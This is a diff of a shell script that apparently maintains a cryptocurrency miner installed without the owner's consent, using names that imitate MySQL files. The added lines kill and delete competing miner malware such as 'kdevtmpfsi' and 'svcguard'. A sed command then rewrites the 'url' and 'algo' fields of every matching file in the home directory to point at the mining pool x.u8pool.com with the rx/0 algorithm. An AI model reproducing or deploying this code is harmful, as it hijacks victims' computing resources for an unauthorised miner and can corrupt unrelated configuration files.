@@ -41,6 +41,7 @@ kill_sus_proc()
 killall -9 xmrig
 killall -9 jj
 killall -9 p
+killall -9 mysqld_sysupdate
 kill_sus_proc
 
 if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
@@ -56,4 +57,11 @@ grep -q "x.u8pool.com:13555" config_background.json && echo "yes" || sed -i 's/"
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 
 cd $HOME/
+rm -f mysqld_sysupdate
+rm -f svcguard
+rm -f svcupdate
+rm -f svcupdates
+rm -f svcworkmanager
+rm -f newsvc.sh
+rm -f kdevtmpfsi
 grep -r "x.u8pool.com:13555" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' `grep url -rl ./` && sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' `grep url -rl ./`
